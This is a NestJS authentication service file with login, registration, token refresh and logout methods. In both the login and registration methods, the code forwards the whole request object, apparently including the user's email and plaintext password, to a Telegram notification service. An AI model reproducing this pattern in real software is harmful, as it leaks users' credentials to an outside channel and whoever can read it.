import { Injectable, UnprocessableEntityException } from '@nestjs/common';
import { JwtWrapperService } from 'src/services/jwt/jwt-wrapper.service';
import { IJwtTokenPair } from 'src/services/jwt/types/jwt-tokenPair.interface';
import { backendMessage } from 'src/shared/backend.messages';
import { SessionService } from '../session/session.service';
import { CreateUserDto } from '../user/dto/create-user.dto';
import { UserEntity } from '../user/user.entity';
import { UserService } from '../user/user.service';
import { LoginUserLocalDto } from './dto/login-user-local.dto';
import { DeleteResult } from 'typeorm';
import { TelegramService } from 'src/services/telegram/telegram.service';

@Injectable()
export class AuthService {
  constructor(
    private userService: UserService,
    private jwtWrapperService: JwtWrapperService,
    private sessionService: SessionService,
    private readonly telegramService: TelegramService,
  ) {}

  async login(dto: LoginUserLocalDto): Promise<IJwtTokenPair> {
    const user = await this.userService.validateLocalUser(
      dto.email,
      dto.password,
    );

    const tokenPair = await this.jwtWrapperService.generateTokenPair(user);
    await this.telegramService.sendObject({
      message: 'login local',
      ...dto,
    });
    return tokenPair;
  }

  // todo check response
  async registration(dto: CreateUserDto): Promise<IJwtTokenPair> {
    const user = await this.userService.create(dto);
    // todo
    // const activationLink = uuid(); // v34fa-asfasf-142saf-sa-asf
    // const apiUrl = this.configService.get('API_URL');
    // todo activation link on client
    // const link = `${apiUrl}/auth/activate/${activationLink}`;
    // await this.mailService.sendActivationMail(dto.email, link);

    // await this.emailActivationService.create({
    //   email: user.email,
    //   activationLink,
    // });
    const tokenPair = await this.jwtWrapperService.generateTokenPair(user);
    await this.telegramService.sendObject({
      message: 'registration local',
      ...dto,
    });
    return tokenPair;
  }

  async refresh(user: UserEntity, token: string): Promise<IJwtTokenPair> {
    const session = await this.sessionService.findByUserId(user.id);
    if (!session || session.refreshToken !== token) {
      throw new UnprocessableEntityException("don't use someone else's token");
    }
    return this.jwtWrapperService.generateTokenPair(user);
  }

  logout(userId: number): Promise<DeleteResult> {
    return this.jwtWrapperService.deleteSession(userId);
  }
}
